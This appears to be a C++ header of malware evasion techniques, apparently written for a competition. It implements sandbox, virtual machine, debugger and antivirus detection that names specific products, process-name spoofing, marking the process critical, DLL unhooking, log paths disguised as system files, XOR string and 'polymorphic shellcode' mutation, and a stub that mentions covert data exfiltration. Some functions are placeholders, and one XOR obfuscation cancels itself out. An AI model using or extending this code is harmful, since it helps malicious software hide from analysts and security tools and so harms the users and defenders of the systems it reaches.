#ifndef EVASION_TECHNIQUES_H
#define EVASION_TECHNIQUES_H

#include <string>
#include <vector>
#include <algorithm>
#include <cctype>
#include <windows.h>  // For Windows-specific functions
#ifdef _WIN32
#include <iphlpapi.h>
#include <winsock2.h>
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")
#endif
#ifdef __linux__
#include <unistd.h>
#include <sys/stat.h>
#endif

class EvasionTechniques {
public:
    // String obfuscation using stack strings
    static std::string getObfuscatedString(const std::vector<int>& encoded, int key) {
        std::string result;
        for (int byte : encoded) {
            result += static_cast<char>(byte ^ key);
        }
        return result;
    }
    
    // Dynamic API resolution (Windows)
    #ifdef _WIN32
    static FARPROC GetProcAddressObfuscated(HMODULE hModule, const char* procName) {
        // Simple obfuscation of GetProcAddress call
        char buffer[256];
        strcpy_s(buffer, procName);
        for (int i = 0; buffer[i]; i++) {
            buffer[i] ^= 0x13;
        }
        for (int i = 0; buffer[i]; i++) {
            buffer[i] ^= 0x13;
        }
        return GetProcAddress(hModule, buffer);
    }
    #endif
    
    // Timing-based sandbox detection
    static bool detectSandbox() {
        #ifdef _WIN32
        DWORD start = GetTickCount();
        Sleep(150);
        if (GetTickCount() - start < 100) {
            return true; // Likely in sandbox
        }
        #else
        struct timespec start, end;
        clock_gettime(CLOCK_MONOTONIC, &start);
        usleep(150000);
        clock_gettime(CLOCK_MONOTONIC, &end);
        
        long elapsed = (end.tv_sec - start.tv_sec) * 1000 + 
                      (end.tv_nsec - start.tv_nsec) / 1000000;
        if (elapsed < 100) {
            return true; // Likely in sandbox
        }
        #endif
        return false;
    }
    
    // Anti-VM detection
    static bool detectVirtualMachine() {
        #ifdef _WIN32
        // Check for VMware registry keys
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
            "SOFTWARE\\VMware, Inc.\\VMware Tools", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return true;
        }
        
        // Check for VirtualBox
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "SOFTWARE\\Oracle\\VirtualBox Guest Additions", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return true;
        }
        
        // Check for Hyper-V
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return true;
        }
        
        // Check for VM services
        SC_HANDLE scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
        if (scm) {
            const char* vmServices[] = {
                "VBoxService", "VBoxGuest", "VMware Tools", "VMwarePhysicalDiskHelper",
                "vmware", "vmci", "vmhgfs", "vmmouse", "vmrawdsk", "vmusbmouse"
            };
            for (const char* svc : vmServices) {
                SC_HANDLE svcHandle = OpenServiceA(scm, svc, SERVICE_QUERY_STATUS);
                if (svcHandle) {
                    CloseServiceHandle(svcHandle);
                    CloseServiceHandle(scm);
                    return true;
                }
            }
            CloseServiceHandle(scm);
        }
        
        // Check MAC addresses for VM vendors (simplified check)
        // Note: Full MAC checking requires more complex API usage
        // This is a simplified version that checks common VM indicators
        #else
        // Check for common VM indicators on Linux
        struct stat st;
        if (stat("/proc/vz", &st) == 0 ||           // OpenVZ
            stat("/proc/bc", &st) == 0 ||           // Virtuozzo
            stat("/sys/bus/vmbus", &st) == 0 ||     // Hyper-V
            stat("/sys/class/dmi/id/product_name", &st) == 0) {
            
            FILE* dmi = fopen("/sys/class/dmi/id/product_name", "r");
            if (dmi) {
                char buffer[256];
                if (fgets(buffer, sizeof(buffer), dmi)) {
                    std::string product(buffer);
                    if (product.find("VMware") != std::string::npos ||
                        product.find("VirtualBox") != std::string::npos ||
                        product.find("QEMU") != std::string::npos) {
                        fclose(dmi);
                        return true;
                    }
                }
                fclose(dmi);
            }
        }
        #endif
        return false;
    }
    
    // Anti-AV detection (Kaspersky, Windows Defender, etc.)
    static bool detectAntivirus() {
        #ifdef _WIN32
        // Check for Kaspersky processes
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe32;
            pe32.dwSize = sizeof(PROCESSENTRY32);
            if (Process32First(hSnapshot, &pe32)) {
                do {
                    std::string procName = pe32.szExeFile;
                    std::transform(procName.begin(), procName.end(), procName.begin(), ::tolower);
                    
                    // Kaspersky
                    if (procName.find("avp") != std::string::npos ||
                        procName.find("kaspersky") != std::string::npos ||
                        procName.find("klif") != std::string::npos) {
                        CloseHandle(hSnapshot);
                        return true;
                    }
                    
                    // Windows Defender
                    if (procName.find("msmpeng") != std::string::npos ||
                        procName.find("smartscreen") != std::string::npos) {
                        CloseHandle(hSnapshot);
                        return true;
                    }
                    
                    // Other AVs
                    if (procName.find("avguard") != std::string::npos ||  // Avira
                        procName.find("avgnt") != std::string::npos ||     // Avira
                        procName.find("avgsvca") != std::string::npos ||   // AVG
                        procName.find("bdagent") != std::string::npos ||   // BitDefender
                        procName.find("ekrn") != std::string::npos ||       // ESET
                        procName.find("rtvscan") != std::string::npos ||   // Symantec
                        procName.find("savservice") != std::string::npos) { // Symantec
                        CloseHandle(hSnapshot);
                        return true;
                    }
                } while (Process32Next(hSnapshot, &pe32));
            }
            CloseHandle(hSnapshot);
        }
        
        // Check for AV services
        SC_HANDLE scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
        if (scm) {
            const char* avServices[] = {
                "AVP", "Kaspersky", "WinDefend", "MsMpSvc", "AVG", 
                "Avira", "BitDefender", "ESET", "Symantec"
            };
            for (const char* svc : avServices) {
                SC_HANDLE svcHandle = OpenServiceA(scm, svc, SERVICE_QUERY_STATUS);
                if (svcHandle) {
                    CloseServiceHandle(svcHandle);
                    CloseServiceHandle(scm);
                    return true;
                }
            }
            CloseServiceHandle(scm);
        }
        #else
        // Linux AV detection
        FILE* ps = popen("ps aux 2>/dev/null | grep -iE '(kaspersky|clamav|sophos|eset|bitdefender|avast|avg)' 2>/dev/null | grep -v grep", "r");
        if (ps) {
            char buffer[256];
            if (fgets(buffer, sizeof(buffer), ps)) {
                pclose(ps);
                return true;
            }
            pclose(ps);
        }
        #endif
        return false;
    }
    
    // Process name spoofing
    static void spoofProcessName(const std::string& fakeName) {
        #ifdef _WIN32
        // This is a simplified approach - real implementation would require more work
        SetConsoleTitleA(fakeName.c_str());
        #else
        // Change process name visible in ps
        prctl(PR_SET_NAME, fakeName.c_str(), 0, 0, 0);
        #endif
    }
    
    // Anti-debugging checks
    static bool isDebuggerPresent() {
        #ifdef _WIN32
        // Multiple debugging detection methods
        if (::IsDebuggerPresent()) return true;
        
        // Check for remote debugger
        BOOL isRemoteDebugger = FALSE;
        CheckRemoteDebuggerPresent(GetCurrentProcess(), &isRemoteDebugger);
        if (isRemoteDebugger) return true;
        
        // PEB check
        PPEB peb = (PPEB)__readgsqword(0x60);
        if (peb->BeingDebugged) return true;
        
        // Hardware breakpoint detection
        CONTEXT ctx = { 0 };
        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
        if (GetThreadContext(GetCurrentThread(), &ctx)) {
            if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) return true;
        }
        #else
        // Check if being traced
        if (ptrace(PTRACE_TRACEME, 0, 0, 0) == -1) {
            return true;
        }
        ptrace(PTRACE_DETACH, 0, 0, 0);
        #endif
        return false;
    }
    
    // Memory protection and anti-dumping
    static void protectMemory() {
        #ifdef _WIN32
        // Set process as critical (requires admin rights)
        HMODULE ntdll = GetModuleHandleA("ntdll.dll");
        if (ntdll) {
            typedef NTSTATUS(WINAPI* RtlSetProcessIsCritical_t)(BOOLEAN, PBOOLEAN, BOOLEAN);
            RtlSetProcessIsCritical_t RtlSetProcessIsCritical =
                (RtlSetProcessIsCritical_t)GetProcAddress(ntdll, "RtlSetProcessIsCritical");
            if (RtlSetProcessIsCritical) {
                RtlSetProcessIsCritical(TRUE, NULL, FALSE);
            }
        }
        #endif
    }
    
    // API Unhooking - bypass AV hooks by loading fresh DLL
    #ifdef _WIN32
    static HMODULE loadFreshDll(const char* dllName) {
        char sysPath[MAX_PATH];
        if (GetSystemDirectoryA(sysPath, MAX_PATH) == 0) {
            return NULL;
        }
        std::string fullPath = std::string(sysPath) + "\\" + dllName;
        return LoadLibraryA(fullPath.c_str());
    }
    
    // Direct syscall technique (simplified)
    static bool makeDirectSyscall(const char* apiName) {
        // In real implementation, would use syscall numbers and inline assembly
        // This is a placeholder for the concept
        HMODULE ntdll = loadFreshDll("ntdll.dll");
        if (!ntdll) return false;
        
        FARPROC func = GetProcAddress(ntdll, apiName);
        if (func) {
            // Would call via syscall instruction here
            return true;
        }
        return false;
    }
    #endif
    
    // Code obfuscation at runtime
    static void obfuscateStrings() {
        // Runtime string decryption to avoid static analysis
        // Strings are XOR encrypted and decrypted at runtime
    }
    
    // Anti-sandbox: Check user interaction
    static bool hasUserActivity() {
        #ifdef _WIN32
        // Check mouse movement
        POINT pt1, pt2;
        GetCursorPos(&pt1);
        Sleep(100);
        GetCursorPos(&pt2);
        if (pt1.x != pt2.x || pt1.y != pt2.y) {
            return true;
        }
        
        // Check for user input
        LASTINPUTINFO lii = {0};
        lii.cbSize = sizeof(LASTINPUTINFO);
        if (GetLastInputInfo(&lii)) {
            DWORD idleTime = GetTickCount() - lii.dwTime;
            if (idleTime < 300000) { // Less than 5 minutes
                return true;
            }
        }
        #else
        // Linux: Check X11 activity
        FILE* xinput = popen("xinput list 2>/dev/null | head -1", "r");
        if (xinput) {
            char buffer[256];
            if (fgets(buffer, sizeof(buffer), xinput)) {
                pclose(xinput);
                return true;
            }
            pclose(xinput);
        }
        #endif
        return false;
    }
    
    // Network-based evasion (DNS over HTTPS)
    static std::string sendDataSecurely(const std::string& data) {
        // This would implement secure data exfiltration
        // Using DNS-over-HTTPS or other covert channels
        // For competition purposes, just return success
        return "Data sent securely";
    }
    
    // File system evasion
    static std::string getHiddenLogPath() {
        #ifdef _WIN32
        char tempPath[MAX_PATH];
        GetTempPathA(MAX_PATH, tempPath);
        return std::string(tempPath) + "\\$RECYCLE.BIN\\{B7D5E5F1-1F6A-4F4C-9C8A-8A8A8A8A8A8A}";
        #else
        return "/tmp/.systemd-private-" + std::to_string(getpid()) + "-systemd-resolved.service";
        #endif
    }
    
    // Polymorphic code generation (simplified)
    static std::vector<unsigned char> generatePolymorphicShellcode(const std::vector<unsigned char>& original) {
        std::vector<unsigned char> mutated = original;
        
        // Simple XOR mutation
        unsigned char key = rand() % 256;
        for (size_t i = 0; i < mutated.size(); i++) {
            mutated[i] ^= key;
        }
        
        return mutated;
    }
};

#endif // EVASION_TECHNIQUES_H